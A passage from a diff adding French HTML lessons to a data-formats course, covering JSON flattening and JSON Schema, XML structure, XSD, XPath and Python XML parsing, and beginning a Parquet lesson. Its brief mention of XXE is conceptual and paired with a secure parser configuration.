+# Pour le tableau imbriqué "articles" : il faut l'exploser en lignes séparées,
+# généralement en conservant les clés parentes pour la jointure logique
+df_articles = pd.json_normalize(
+    commande, record_path="articles", meta=["commande_id", ["client", "nom"]]
+)
+print(df_articles)
+#    produit  quantite  prix_unitaire  commande_id  client.nom
+# 0  Clavier  1         45.0           1001         Alice Martin
+# 1  Souris   2         15.0           1001         Alice Martin</code></pre>
+
+      <h3>Le compromis : duplication de données vs simplicité de requête</h3>
+      <p>Remarquez que dans <code>df_articles</code>, le nom du client ("Alice Martin") est <strong>dupliqué</strong> sur chaque ligne d'article — c'est le prix classique de la dénormalisation : les colonnes issues de la relation "un" (une commande a un seul client) sont répétées pour chaque ligne de la relation "plusieurs" (une commande a plusieurs articles). C'est acceptable et même souhaitable pour de l'analyse ponctuelle, mais représente une redondance qu'une base de données relationnelle normalisée éviterait via des tables séparées et des clés étrangères.</p>
+
+      <h3>Garder la structure imbriquée : quand c'est le bon choix</h3>
+      <p>Aplatir n'est pas toujours souhaitable. Si les données sont stockées dans une base orientée document (MongoDB) ou traitées par du code qui manipule naturellement des structures imbriquées (une API qui retransmet directement l'objet reçu), conserver la hiérarchie JSON native évite un aller-retour de transformation inutile. La dénormalisation n'est justifiée que lorsque l'objectif final est une analyse tabulaire (SQL, pandas, tableur).</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Aplatir automatiquement une structure JSON profondément imbriquée (5+ niveaux) sans réfléchir à la cardinalité de chaque relation (un-à-un vs un-à-plusieurs), produisant soit une perte d'information (si un tableau imbriqué est simplement ignoré), soit une explosion combinatoire du nombre de lignes si plusieurs tableaux imbriqués à des niveaux différents sont aplatis ensemble sans jointure logique claire.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Un document JSON représente une commande avec un tableau "articles" ET un tableau "paiements" (une commande peut être payée en plusieurs fois). Si vous aplatissez naïvement ces deux tableaux ensemble dans une seule table, quel problème structurel obtenez-vous, et comment le résoudriez-vous ?
+      </div>
+    </section>
+
+    <section id="m3-l4" class="fmt-json">
+      <span class="lesson-kicker"><span class="fmt-badge">.JSON</span>Module 3 · Leçon 4</span>
+      <h2>Valider un JSON avec JSON Schema</h2>
+
+      <p>JSON, contrairement à Parquet ou XML avec XSD, n'impose par défaut aucune contrainte sur la structure attendue d'un document — n'importe quel objet valide syntaxiquement sera accepté, même s'il manque des champs obligatoires ou si un champ contient un type inattendu. <strong>JSON Schema</strong> comble ce manque en fournissant un vocabulaire formel (lui-même écrit en JSON) pour décrire et valider la structure attendue d'un document JSON.</p>
+
+      <pre><code class="language-json">{
+  "type": "object",
+  "properties": {
+    "id": {"type": "integer"},
+    "nom": {"type": "string", "minLength": 1},
+    "email": {"type": "string", "format": "email"},
+    "age": {"type": "integer", "minimum": 0, "maximum": 130}
+  },
+  "required": ["id", "nom", "email"]
+}</code></pre>
+
+      <pre><code class="language-python">import jsonschema
+
+schema = {
+    "type": "object",
+    "properties": {
+        "id": {"type": "integer"},
+        "nom": {"type": "string", "minLength": 1},
+        "age": {"type": "integer", "minimum": 0}
+    },
+    "required": ["id", "nom"]
+}
+
+donnees_valides = {"id": 1, "nom": "Alice", "age": 30}
+donnees_invalides = {"id": "abc", "nom": "", "age": -5}  # id devrait être un entier, nom vide, age négatif
+
+jsonschema.validate(donnees_valides, schema)  # ne lève aucune exception
+
+try:
+    jsonschema.validate(donnees_invalides, schema)
+except jsonschema.exceptions.ValidationError as e:
+    print(f"Validation échouée : {e.message}")</code></pre>
+
+      <h3>Pourquoi valider explicitement plutôt que de faire confiance à l'émetteur</h3>
+      <p>Dans un système distribué où des données JSON transitent entre plusieurs équipes ou entreprises (API publique, intégration partenaire), faire confiance implicitement à la structure des données reçues est un pari risqué — une évolution non annoncée de l'API amont (un champ renommé, un type changé de chaîne à nombre) peut silencieusement casser le traitement en aval, avec une erreur qui n'apparaît que plusieurs étapes plus loin dans le pipeline, loin de sa cause réelle. Valider explicitement à la frontière du système (dès la réception) permet de détecter le problème immédiatement, avec un message d'erreur clair pointant vers la cause exacte.</p>
+
+      <h3>Où placer la validation dans un pipeline de données</h3>
+      <p>La bonne pratique est de valider les données JSON <strong>dès leur point d'entrée</strong> dans le système (à la réception d'une requête API, au moment de l'ingestion dans un pipeline), plutôt que de laisser des données potentiellement malformées se propager profondément dans le système avant d'échouer sur une erreur de type difficile à tracer jusqu'à sa source réelle.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Ne valider un JSON qu'implicitement, en laissant le code planter avec une exception générique (<code>KeyError</code>, <code>TypeError</code>) au moment où un champ manquant ou mal typé est utilisé, potentiellement très loin dans le pipeline par rapport au point d'entrée des données. Une validation explicite avec JSON Schema en amont produit un message d'erreur immédiat et précis, bien plus facile à diagnostiquer et à corriger.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Une API partenaire vous envoie des commandes au format JSON. Le mois dernier, un changement silencieux côté partenaire a transformé le champ "quantite" de type entier en type chaîne ("3" au lieu de 3), cassant un calcul de total en aval trois étapes plus loin dans le pipeline. Rédigez le fragment de JSON Schema qui aurait permis de détecter ce problème immédiatement à la réception.
+      </div>
+    </section>
+
+    <section id="m3-l5" class="fmt-json">
+      <span class="lesson-kicker"><span class="fmt-badge">.JSON</span>Module 3 · Leçon 5</span>
+      <h2>Manipuler JSON Efficacement en Python</h2>
+
+      <p>Cette leçon de synthèse pratique couvre les patterns Python les plus utiles pour lire, transformer et écrire du JSON dans un contexte de data analytics, au-delà des opérations basiques de <code>json.load</code>/<code>json.dump</code> déjà vues.</p>
+
+      <h3>Lecture et écriture de base, avec options utiles</h3>
+      <pre><code class="language-python">import json
+
+# Lecture depuis un fichier
+with open("donnees.json", encoding="utf-8") as f:
+    donnees = json.load(f)
+
+# Écriture avec formatage lisible pour un humain (indent) et préservation des accents
+with open("sortie.json", "w", encoding="utf-8") as f:
+    json.dump(donnees, f, indent=2, ensure_ascii=False)
+    # ensure_ascii=False : préserve "café" au lieu de l'échapper en "café"
+    # indent=2 : formatage lisible -- à omettre en production pour économiser l'espace disque</code></pre>
+
+      <h3>Gérer les types non natifs (dates, Decimal) avec un encodeur personnalisé</h3>
+      <p>Puisque JSON ne connaît pas nativement les objets <code>datetime</code> ou <code>Decimal</code> de Python, sérialiser directement une structure qui en contient lève une <code>TypeError</code>. Un encodeur personnalisé permet de définir comment convertir ces types en une représentation JSON valide.</p>
+
+      <pre><code class="language-python">import json
+from datetime import datetime
+from decimal import Decimal
+
+class EncodeurPersonnalise(json.JSONEncoder):
+    def default(self, obj):
+        if isinstance(obj, datetime):
+            return obj.isoformat()
+        if isinstance(obj, Decimal):
+            return str(obj)  # préserve la précision décimale exacte, contrairement à float()
+        return super().default(obj)
+
+donnees = {"montant": Decimal("19.99"), "cree_le": datetime.now()}
+print(json.dumps(donnees, cls=EncodeurPersonnalise))</code></pre>
+
+      <h3>Extraire des valeurs profondément imbriquées sans lever d'exception</h3>
+      <pre><code class="language-python"># Accès direct : casse si un niveau intermédiaire est absent
+# valeur = donnees["client"]["adresse"]["code_postal"]  # KeyError si "adresse" absent
+
+# Accès défensif avec .get() en chaîne, plus robuste face à des champs optionnels
+valeur = donnees.get("client", {}).get("adresse", {}).get("code_postal")
+print(valeur)  # None si n'importe quel niveau intermédiaire est absent, sans exception</code></pre>
+
+      <h3>Traiter un gros JSON Lines efficacement avec pandas</h3>
+      <pre><code class="language-python">import pandas as pd
+
+# lines=True indique explicitement le format JSON Lines (Module 3, leçon 2)
+df = pd.read_json("evenements.jsonl", lines=True)
+
+# Écriture au même format
+df.to_json("sortie.jsonl", orient="records", lines=True, force_ascii=False)</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Convertir un montant financier en <code>float</code> lors de la désérialisation JSON par simplicité, puis effectuer des calculs cumulés (sommes sur des milliers de transactions) qui accumulent des erreurs d'arrondi liées à la représentation binaire des flottants (0.1 + 0.2 ≠ 0.3 exactement en IEEE 754). Utiliser <code>Decimal</code> pour tout calcul financier précis, en acceptant l'encodage/décodage personnalisé que cela implique avec JSON.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Vous recevez un flux de 2 millions d'événements JSON Lines par jour et devez calculer, chaque jour, le montant total par catégorie. Écrivez le squelette d'une approche en streaming (sans jamais charger l'intégralité du fichier en mémoire) qui accumule ces totaux ligne par ligne.
+      </div>
+    </section>
+
+    <div class="module-divider">
+      <span class="num">MODULE 04 · .XML</span>
+      <span class="line"></span>
+    </div>
+
+    <section id="m4-l1" class="fmt-xml">
+      <span class="lesson-kicker"><span class="fmt-badge">.XML</span>Module 4 · Leçon 1</span>
+      <h2>Anatomie de XML : Éléments, Attributs et Namespaces</h2>
+
+      <p>XML (eXtensible Markup Language) a précédé JSON de près d'une décennie comme format d'échange de données structurées, et reste aujourd'hui incontournable dans de nombreux secteurs historiquement établis (finance, santé, administration, industrie). Sa syntaxe est plus verbeuse que JSON, mais elle offre des mécanismes de validation et d'expressivité (attributs, namespaces, mixed content) que JSON n'a jamais cherché à égaler.</p>
+
+      <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;commande id="1001" statut="validee"&gt;
+  &lt;client&gt;
+    &lt;nom&gt;Alice Martin&lt;/nom&gt;
+    &lt;email&gt;alice@exemple.fr&lt;/email&gt;
+  &lt;/client&gt;
+  &lt;articles&gt;
+    &lt;article quantite="1"&gt;Clavier&lt;/article&gt;
+    &lt;article quantite="2"&gt;Souris&lt;/article&gt;
+  &lt;/articles&gt;
+&lt;/commande&gt;</code></pre>
+
+      <h3>Éléments vs attributs : une distinction souvent débattue</h3>
+      <p>Remarquez dans l'exemple ci-dessus deux façons différentes de représenter une information : <code>id="1001"</code> est un <strong>attribut</strong> de l'élément <code>commande</code>, tandis que <code>&lt;nom&gt;Alice Martin&lt;/nom&gt;</code> est un <strong>élément enfant</strong> avec son propre contenu textuel. XML ne force aucune règle absolue sur quand utiliser l'un ou l'autre, mais une convention largement adoptée consiste à utiliser les attributs pour des métadonnées courtes et non répétables (un identifiant, un statut), et les éléments pour le contenu principal, en particulier s'il peut être répété ou contenir lui-même une structure imbriquée.</p>
+
+      <h3>Les namespaces : éviter les collisions de noms entre vocabulaires</h3>
+      <p>Un document XML combine parfois des éléments provenant de vocabulaires différents (par exemple un document intégrant à la fois des balises métier et des balises de signature électronique standardisées). Les <strong>namespaces</strong> XML évitent les collisions de noms en préfixant les éléments avec un identifiant associé à une URI de référence, un mécanisme sans équivalent direct en JSON.</p>
+
+      <pre><code class="language-xml">&lt;facture xmlns:fac="http://exemple.fr/facturation"
+         xmlns:sig="http://exemple.fr/signature"&gt;
+  &lt;fac:montant&gt;1200.00&lt;/fac:montant&gt;
+  &lt;sig:empreinte&gt;a3f5e9...&lt;/sig:empreinte&gt;
+&lt;/facture&gt;
+&lt;!-- fac:montant et sig:empreinte ne peuvent jamais entrer en collision,
+     même si un autre vocabulaire définissait aussi un élément "montant" --&gt;</code></pre>
+
+      <h3>Le "mixed content" : texte et éléments entremêlés</h3>
+      <p>Une capacité propre à XML, sans équivalent naturel en JSON, est le contenu mixte : un élément peut contenir à la fois du texte libre et des sous-éléments entremêlés, une structure typique des documents (HTML, qui est lui-même un dialecte XML-like, en est l'exemple le plus connu). JSON, conçu pour des structures de données plutôt que des documents, ne modélise pas naturellement ce cas — c'est une des raisons pour lesquelles XML reste dominant pour tout ce qui touche à la représentation de documents riches plutôt qu'à de simples enregistrements de données.</p>
+
+      <pre><code class="language-xml">&lt;paragraphe&gt;
+  Le client a signalé un problème avec sa &lt;produit&gt;imprimante&lt;/produit&gt;
+  après &lt;duree&gt;3 jours&lt;/duree&gt; d'utilisation.
+&lt;/paragraphe&gt;
+&lt;!-- Le texte libre et les balises produit/duree sont entremêlés --&gt;</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Traiter un document XML riche en contenu mixte (mélange de texte et de balises) avec un outil pensé pour des données structurées simples (comme un convertisseur XML-vers-JSON générique), qui échoue souvent à préserver correctement l'ordre et la position du texte libre par rapport aux éléments imbriqués — cette information peut être silencieusement perdue ou déformée lors de la conversion.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Un document XML représente une notice médicale avec des paragraphes de texte libre contenant des références croisées à des balises comme <code>&lt;principe_actif&gt;</code> ou <code>&lt;posologie&gt;</code> entremêlées au texte. Expliquez pourquoi convertir ce document en JSON de façon naïve risque de perdre de l'information, contrairement à un document représentant une simple liste de commandes.
+      </div>
+    </section>
+
+    <section id="m4-l2" class="fmt-xml">
+      <span class="lesson-kicker"><span class="fmt-badge">.XML</span>Module 4 · Leçon 2</span>
+      <h2>DTD et XML Schema (XSD) : Valider la Structure</h2>
+
+      <p>Contrairement à JSON, où la validation de structure nécessite un outil externe optionnel (JSON Schema, vu au Module 3), XML a intégré la validation de structure dans son écosystème dès sa conception, via deux mécanismes complémentaires d'âges différents : la DTD (Document Type Definition), plus ancienne et limitée, et XML Schema (XSD), plus récent et nettement plus expressif.</p>
+
+      <h3>La DTD : le mécanisme de validation historique</h3>
+      <pre><code class="language-xml">&lt;!DOCTYPE commande [
+  &lt;!ELEMENT commande (client, articles)&gt;
+  &lt;!ATTLIST commande id CDATA #REQUIRED&gt;
+  &lt;!ELEMENT client (nom, email)&gt;
+  &lt;!ELEMENT nom (#PCDATA)&gt;
+  &lt;!ELEMENT email (#PCDATA)&gt;
+  &lt;!ELEMENT articles (article+)&gt;
+  &lt;!ELEMENT article (#PCDATA)&gt;
+]&gt;</code></pre>
+      <p>La DTD définit quels éléments peuvent apparaître, dans quel ordre, et avec quelle cardinalité (<code>+</code> pour "un ou plusieurs", <code>*</code> pour "zéro ou plusieurs", <code>?</code> pour "optionnel"). Sa limite principale est qu'elle ne connaît aucun type de données au sens strict — <code>#PCDATA</code> signifie simplement "du texte", sans distinction entre un entier, une date ou une chaîne libre.</p>
+
+      <h3>XML Schema (XSD) : validation riche et typée</h3>
+      <pre><code class="language-xml">&lt;xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"&gt;
+  &lt;xs:element name="commande"&gt;
+    &lt;xs:complexType&gt;
+      &lt;xs:sequence&gt;
+        &lt;xs:element name="montant" type="xs:decimal"/&gt;
+        &lt;xs:element name="date" type="xs:date"/&gt;
+        &lt;xs:element name="quantite"&gt;
+          &lt;xs:simpleType&gt;
+            &lt;xs:restriction base="xs:integer"&gt;
+              &lt;xs:minInclusive value="1"/&gt;
+            &lt;/xs:restriction&gt;
+          &lt;/xs:simpleType&gt;
+        &lt;/xs:element&gt;
+      &lt;/xs:sequence&gt;
+      &lt;xs:attribute name="id" type="xs:string" use="required"/&gt;
+    &lt;/xs:complexType&gt;
+  &lt;/xs:element&gt;
+&lt;/xs:schema&gt;</code></pre>
+
+      <p>Contrairement à la DTD, XSD dispose d'un système de types riche (entiers, décimaux, dates, booléens) et permet des contraintes fines (une quantité doit être un entier positif, un montant doit être un décimal). XSD est lui-même écrit en XML, ce qui permet de le traiter avec les mêmes outils que n'importe quel autre document XML.</p>
+
+      <pre><code class="language-python">from lxml import etree
+
+schema_xsd = etree.XMLSchema(etree.parse("commande.xsd"))
+document = etree.parse("commande.xml")
+
+if schema_xsd.validate(document):
+    print("Document valide")
+else:
+    print(schema_xsd.error_log)  # liste précise des violations, avec numéro de ligne</code></pre>
+
+      <h3>Pourquoi cette validation intégrée reste un avantage décisif de XML dans certains secteurs</h3>
+      <p>Dans des secteurs à forte contrainte réglementaire (échanges bancaires SWIFT, dossiers médicaux HL7, déclarations fiscales), pouvoir garantir <em>mécaniquement et avant tout traitement</em> qu'un document respecte une structure et des types précis est une exigence de conformité, pas seulement une commodité de développement. C'est une des raisons structurelles pour lesquelles XML reste ancré dans ces secteurs malgré la popularité plus récente de JSON (approfondi en leçon 4).</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Considérer qu'un document XML "bien formé" (syntaxiquement correct, balises bien fermées) est automatiquement "valide" (conforme à un schéma métier attendu). Ce sont deux notions distinctes : un document peut être parfaitement bien formé tout en violant complètement la structure attendue par XSD (champs manquants, types incorrects) — toujours valider explicitement contre le schéma, pas seulement vérifier que le parsing ne lève pas d'erreur de syntaxe.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Un document XML est syntaxiquement valide (toutes les balises sont bien fermées et imbriquées correctement) mais contient un champ "quantite" avec la valeur "trois" au lieu d'un nombre. Un parseur XML basique laissera-t-il passer ce document sans erreur ? Comment un schéma XSD comme celui de l'exemple ci-dessus permettrait-il de le rejeter automatiquement ?
+      </div>
+    </section>
+
+    <section id="m4-l3" class="fmt-xml">
+      <span class="lesson-kicker"><span class="fmt-badge">.XML</span>Module 4 · Leçon 3</span>
+      <h2>XPath : Naviguer dans un Document XML</h2>
+
+      <p>XPath est un langage d'interrogation dédié à la navigation dans la structure hiérarchique d'un document XML, permettant de sélectionner précisément un élément, un attribut, ou un ensemble de nœuds sans avoir à parcourir manuellement l'arbre XML niveau par niveau en code. C'est l'équivalent XML de ce que les sélecteurs CSS sont au HTML.</p>
+
+      <pre><code class="language-xml">&lt;catalogue&gt;
+  &lt;produit categorie="informatique"&gt;
+    &lt;nom&gt;Clavier mécanique&lt;/nom&gt;
+    &lt;prix&gt;89.90&lt;/prix&gt;
+  &lt;/produit&gt;
+  &lt;produit categorie="mobilier"&gt;
+    &lt;nom&gt;Chaise de bureau&lt;/nom&gt;
+    &lt;prix&gt;249.00&lt;/prix&gt;
+  &lt;/produit&gt;
+&lt;/catalogue&gt;</code></pre>
+
+      <table>
+        <tr><th>Expression XPath</th><th>Sélectionne</th></tr>
+        <tr><td><code>/catalogue/produit</code></td><td>Tous les éléments produit, enfants directs de catalogue</td></tr>
+        <tr><td><code>//nom</code></td><td>Tous les éléments nom, à n'importe quelle profondeur</td></tr>
+        <tr><td><code>//produit[@categorie='informatique']</code></td><td>Les produits dont l'attribut categorie vaut "informatique"</td></tr>
+        <tr><td><code>//produit[prix &gt; 100]</code></td><td>Les produits dont le prix dépasse 100</td></tr>
+        <tr><td><code>//produit[1]</code></td><td>Le premier élément produit (index 1, pas 0, en XPath)</td></tr>
+      </table>
+
+      <pre><code class="language-python">from lxml import etree
+
+document = etree.parse("catalogue.xml")
+
+# Sélection avec filtre sur un attribut
+produits_info = document.xpath("//produit[@categorie='informatique']")
+for p in produits_info:
+    nom = p.find("nom").text
+    print(nom)
+
+# Sélection avec filtre numérique sur le contenu d'un élément
+produits_chers = document.xpath("//produit[prix > 100]/nom/text()")
+print(produits_chers)  # ['Chaise de bureau']</code></pre>
+
+      <h3>Le piège de l'indexation à partir de 1</h3>
+      <p>Contrairement à la quasi-totalité des langages de programmation modernes (Python, JavaScript, Java) où l'indexation commence à 0, XPath indexe ses éléments <strong>à partir de 1</strong> — <code>//produit[1]</code> sélectionne le premier produit, et <code>//produit[0]</code> ne sélectionne rien du tout (silencieusement, sans erreur). C'est une source d'erreur classique pour tout développeur habitué aux conventions zero-indexed des langages généralistes.</p>
+
+      <h3>Namespaces et XPath : une complication fréquente</h3>
+      <p>Si le document utilise des namespaces (leçon 1), les expressions XPath doivent explicitement déclarer et référencer ces namespaces — une requête XPath qui ignore les préfixes de namespace échouera silencieusement en ne retournant aucun résultat, sans message d'erreur explicite, ce qui rend ce problème particulièrement difficile à diagnostiquer pour un débutant.</p>
+
+      <pre><code class="language-python">namespaces = {"fac": "http://exemple.fr/facturation"}
+montants = document.xpath("//fac:montant/text()", namespaces=namespaces)
+# Sans le paramètre namespaces explicite, cette requête retournerait silencieusement une liste vide</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Écrire une requête XPath qui retourne systématiquement une liste vide sur un document dont on est pourtant certain qu'il contient les éléments recherchés, sans lever d'erreur explicite. La cause la plus fréquente est l'oubli de déclarer les namespaces utilisés dans le document — toujours vérifier <code>document.getroot().nsmap</code> (avec lxml) avant d'écrire une requête XPath sur un nouveau document.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Écrivez l'expression XPath qui sélectionne le nom de tous les produits dont le prix est strictement inférieur à 100, en utilisant la structure XML du catalogue présentée dans cette leçon.
+      </div>
+    </section>
+
+    <section id="m4-l4" class="fmt-xml">
+      <span class="lesson-kicker"><span class="fmt-badge">.XML</span>Module 4 · Leçon 4</span>
+      <h2>Pourquoi XML Domine Encore Certains Secteurs</h2>
+
+      <p>Il est courant d'entendre que "XML est un format dépassé, remplacé par JSON" — une simplification qui ne résiste pas à l'observation de nombreux secteurs où XML reste non seulement présent, mais activement le format de référence pour les nouveaux échanges. Comprendre pourquoi permet d'éviter le piège consistant à imposer JSON par défaut dans un contexte où XML reste objectivement le meilleur choix technique.</p>
+
+      <h3>Les secteurs où XML domine, et pourquoi</h3>
+      <ul>
+        <li><strong>Finance</strong> : les messages SWIFT et le standard ISO 20022 pour les virements bancaires internationaux sont basés sur XML, avec des schémas XSD extrêmement stricts imposés réglementairement à toutes les banques du monde — un changement de format nécessiterait une coordination internationale massive, sans bénéfice suffisant pour la justifier.</li>
+        <li><strong>Santé</strong> : le standard HL7 (échange de dossiers médicaux) utilise XML pour sa capacité à représenter du contenu mixte riche (texte médical libre entremêlé de codes structurés) et sa validation stricte via XSD, cruciale dans un contexte où une erreur de structure peut avoir des conséquences graves.</li>
+        <li><strong>Documents bureautiques</strong> : les formats Microsoft Office modernes (.docx, .xlsx, .pptx) sont en réalité des archives ZIP contenant des fichiers XML structurés en interne — invisible pour l'utilisateur final, mais bien réel pour quiconque manipule ces fichiers par programmation.</li>
+        <li><strong>Configuration et transformation de documents</strong> : XSLT (transformation XML vers un autre format, y compris HTML ou un autre XML) reste un outil puissant sans équivalent direct aussi mature côté JSON pour des transformations de documents complexes.</li>
+        <li><strong>SOAP et les web services legacy</strong> : de nombreux systèmes d'entreprise plus anciens (ERP, systèmes gouvernementaux) exposent encore des APIs SOAP, intrinsèquement basées sur XML, et migrer ces intégrations vers REST/JSON représente un coût souvent jugé non prioritaire face au risque.</li>
+      </ul>
+
+      <h3>Les raisons techniques structurelles, au-delà de l'inertie historique</h3>
+      <p>Il serait réducteur d'attribuer la persistance de XML uniquement à l'inertie ou à la difficulté de migrer des systèmes legacy. XML offre des capacités que JSON n'a jamais cherché à reproduire : validation de schéma intégrée et mature (leçon 2), gestion native du contenu mixte texte/balises (leçon 1), namespaces pour combiner plusieurs vocabulaires sans collision, et un écosystème de transformation (XSLT) et de requête (XPath, XQuery) largement plus développé pour manipuler des documents complexes plutôt que de simples structures de données.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Recommander systématiquement de "migrer de XML vers JSON" pour "moderniser" un système sans avoir identifié si les capacités spécifiques de XML (validation XSD stricte, contenu mixte, namespaces, conformité réglementaire à un standard basé sur XML) sont activement utilisées. Une telle migration peut s'avérer nettement plus coûteuse et risquée que le gain de "modernité" ne le justifie, en particulier dans des secteurs réglementés.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Une banque doit échanger des ordres de virement avec 40 autres banques internationales selon le standard ISO 20022 (XML). Un jeune développeur propose de négocier un format JSON personnalisé "plus moderne et plus simple". Identifiez au moins deux obstacles concrets, au-delà de la simple préférence technique, qui rendent cette proposition irréaliste à court terme.
+      </div>
+    </section>
+
+    <section id="m4-l5" class="fmt-xml">
+      <span class="lesson-kicker"><span class="fmt-badge">.XML</span>Module 4 · Leçon 5</span>
+      <h2>Parser XML en Python : ElementTree et lxml</h2>
+
+      <p>Python propose deux bibliothèques principales pour manipuler du XML, avec des compromis différents entre simplicité, performance et richesse fonctionnelle : <code>xml.etree.ElementTree</code>, incluse dans la bibliothèque standard, et <code>lxml</code>, une bibliothèque tierce plus complète et performante mais nécessitant une installation séparée.</p>
+
+      <h3>ElementTree : simple, inclus par défaut, suffisant pour des besoins basiques</h3>
+      <pre><code class="language-python">import xml.etree.ElementTree as ET
+
+arbre = ET.parse("catalogue.xml")
+racine = arbre.getroot()
+
+for produit in racine.findall("produit"):
+    nom = produit.find("nom").text
+    prix = float(produit.find("prix").text)
+    categorie = produit.get("categorie")  # accès à un attribut
+    print(f"{nom} ({categorie}) : {prix}€")
+
+# Construction d'un nouveau document XML
+nouveau_produit = ET.SubElement(racine, "produit", categorie="accessoire")
+ET.SubElement(nouveau_produit, "nom").text = "Tapis de souris"
+ET.SubElement(nouveau_produit, "prix").text = "12.50"
+
+arbre.write("catalogue_maj.xml", encoding="utf-8", xml_declaration=True)</code></pre>
+
+      <h3>lxml : XPath complet, validation XSD, performance supérieure</h3>
+      <p>ElementTree ne supporte qu'un sous-ensemble limité de XPath (pas de conditions complexes, pas de fonctions XPath avancées) et ne propose aucune validation XSD native. <code>lxml</code>, construit sur les bibliothèques C libxml2/libxslt, comble ces limites et offre de meilleures performances sur de gros documents.</p>
+
+      <pre><code class="language-python">from lxml import etree
+
+arbre = etree.parse("catalogue.xml")
+
+# XPath complet, avec conditions et fonctions -- impossible avec ElementTree seul
+produits_chers = arbre.xpath("//produit[prix > 50]/nom/text()")
+print(produits_chers)
+
+# Validation XSD native (Module 4, leçon 2) -- absente d'ElementTree
+schema = etree.XMLSchema(etree.parse("catalogue.xsd"))
+print(schema.validate(arbre))</code></pre>
+
+      <h3>La vulnérabilité XXE : un piège de sécurité critique lié au parsing XML</h3>
+      <p>Le parsing XML expose une vulnérabilité de sécurité spécifique appelée <strong>XXE (XML External Entity)</strong> : un document XML malveillant peut définir une "entité externe" qui, si le parseur la résout, peut lire des fichiers arbitraires du système ou effectuer des requêtes réseau non autorisées. Cette vulnérabilité est développée en détail au Module 8, mais il est essentiel de retenir dès maintenant qu'un parseur XML doit être configuré pour <strong>désactiver la résolution des entités externes</strong> par défaut, en particulier lorsqu'il traite des documents provenant d'une source non fiable (upload utilisateur, API externe).</p>
+
+      <pre><code class="language-python">from lxml import etree
+
+# Configuration sécurisée : désactive explicitement la résolution des entités externes
+parseur_securise = etree.XMLParser(resolve_entities=False, no_network=True)
+arbre = etree.parse("document_non_fiable.xml", parser=parseur_securise)</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Parser un document XML provenant d'une source externe non fiable (formulaire d'upload, API tierce) avec la configuration par défaut d'un parseur XML, sans désactiver explicitement la résolution des entités externes. C'est l'une des vulnérabilités OWASP les plus documentées historiquement pour les applications qui traitent du XML — voir le Module 8, leçon 3 pour un traitement complet de cette vulnérabilité.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Vous développez un endpoint d'API qui accepte des documents XML uploadés par des utilisateurs externes pour les convertir en JSON. Entre ElementTree et lxml, lequel choisiriez-vous compte tenu à la fois des besoins de validation XSD et de sécurité évoqués dans cette leçon, et quelle configuration précise appliqueriez-vous au parseur ?
+      </div>
+    </section>
+
+    <div class="module-divider">
+      <span class="num">MODULE 05 · .PARQUET</span>
+      <span class="line"></span>
+    </div>
+
+    <section id="m5-l1" class="fmt-parquet">
+      <span class="lesson-kicker"><span class="fmt-badge">.PARQUET</span>Module 5 · Leçon 1</span>
+      <h2>Le Stockage Columnar : Pourquoi Ça Change Tout pour l'Analytique</h2>
+
+      <p>Le Module 1 (leçon 3) a introduit la distinction entre stockage orienté ligne et orienté colonne. Ce module approfondit Parquet, le format columnar open-source devenu le standard de facto du stockage analytique moderne (data lakes, entrepôts de données cloud, moteurs de requête distribués comme Spark, Presto/Trino, ou DuckDB).</p>
+
+      <p>Parquet a été conçu dès l'origine (projet initié chez Twitter et Cloudera en 2013, aujourd'hui projet Apache) pour un objectif précis : rendre les requêtes analytiques sur de très gros volumes de données aussi rapides et économes en ressources que possible, en exploitant systématiquement trois leviers combinés — l'organisation en colonnes, la compression avancée par type de colonne, et les métadonnées permettant de sauter la lecture de blocs entiers non pertinents pour une requête donnée (detaillé en leçon 4).</p>
+
+      <h3>Un chiffre concret pour illustrer l'ampleur du gain</h3>
+      <pre><code class="language-python">import pandas as pd
+import numpy as np
+import time
+
+np.random.seed(0)
+n = 5_000_000
+df = pd.DataFrame({
+    "id": range(n),
+    "pays": np.random.choice(["FR", "DE", "ES", "IT", "UK"], n),
+    "montant": np.random.uniform(10, 5000, n),
+    "commentaire_libre": ["Commentaire client détaillé " * 3] * n,  # colonne large, non utilisée ici
+})
+
+df.to_csv("donnees.csv", index=False)
+df.to_parquet("donnees.parquet", engine="pyarrow")
+
+import os
+print(f"Taille CSV     : {os.path.getsize('donnees.csv') / 1e6:.1f} Mo")
+print(f"Taille Parquet : {os.path.getsize('donnees.parquet') / 1e6:.1f} Mo")
+
+# Requête : moyenne du montant uniquement -- n'a besoin que d'une seule colonne sur quatre
+debut = time.time()
+moyenne_csv = pd.read_csv("donnees.csv", usecols=["montant"])["montant"].mean()
+print(f"CSV : {time.time() - debut:.2f}s")
+
+debut = time.time()
+moyenne_parquet = pd.read_parquet("donnees.parquet", columns=["montant"])["montant"].mean()
+print(f"Parquet : {time.time() - debut:.2f}s")
+# Parquet est généralement plusieurs fois plus rapide et le fichier plusieurs fois plus petit,
+# l'écart s'accentuant avec le nombre de colonnes non lues et le volume de données</code></pre>
+
+      <h3>Pourquoi ce gain s'accentue avec la largeur de la table</h3>
